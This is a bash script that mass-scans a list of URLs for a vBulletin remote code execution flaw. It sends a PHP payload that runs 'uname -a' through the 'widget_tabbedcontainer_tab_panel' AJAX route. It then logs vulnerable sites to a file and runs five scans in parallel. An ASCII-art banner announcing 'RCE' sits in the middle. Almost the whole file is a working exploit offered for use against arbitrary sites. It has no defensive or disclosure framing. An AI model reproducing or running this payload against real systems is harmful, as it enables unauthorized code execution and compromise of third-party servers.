#!/bin/bash
shiraookaaaaaaaaaaaaaaaaaa(){
	rce=$(curl -skL --connect-timeout 20 --max-time 20 "$1/ajax/render/widget_tabbedcontainer_tab_panel" --data "subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo system('uname -a');")
	delete=$(echo $rce  | sed 's/\\r//g' | sed 's/\\n//g' | sed 's/\\r//g' | sed 's/\\t//g' | sed 's/\\//g')
	result=$(echo $delete | grep -Po '(?<=<div class="widget-content">)[^</]*')
	if [[ $result == '' ]]; then
		printf "NO VULN => $1\n"
	else
		printf "VULN => $1 ($result)\n"
		echo "$1">>vbullet.txt
	fi
}
cat << "EOF"
                      .".
                     /  |
                    /  /
                   / ,"
       .-------.--- /
      "._ __.-/ o. o\
         "   (    Y  )
              )     /
             /     (
            /       Y
        .-"         |
       /  _     \    \
      /    `. ". ) /' )
     Y       )( / /(,/
    ,|      /     )
   ( |     /     /
    " \_  (__   (__        [RCEEEEEEEEEEEEEEEEEEEEEEEEEEE]
        "-._,)--._,)       [Thanks To Archie Rythm]
EOF
echo ""
read -p "List URL : " listna;

IFS=$'\r\n' GLOBIGNORE='*' command eval 'bacot=($(cat $listna))'
waktumulai=$(date +%s)
for (( i = 0; i <"${#bacot[@]}"; i++ )); do
	WOW="${bacot[$i]}"
	IFS='' read -r -a array <<< "$WOW"
	ipx=${array[0]}
	((cthread=cthread%5)); ((cthread++==0)) && wait
	shiraookaaaaaaaaaaaaaaaaaa ${ipx} &
done
wait
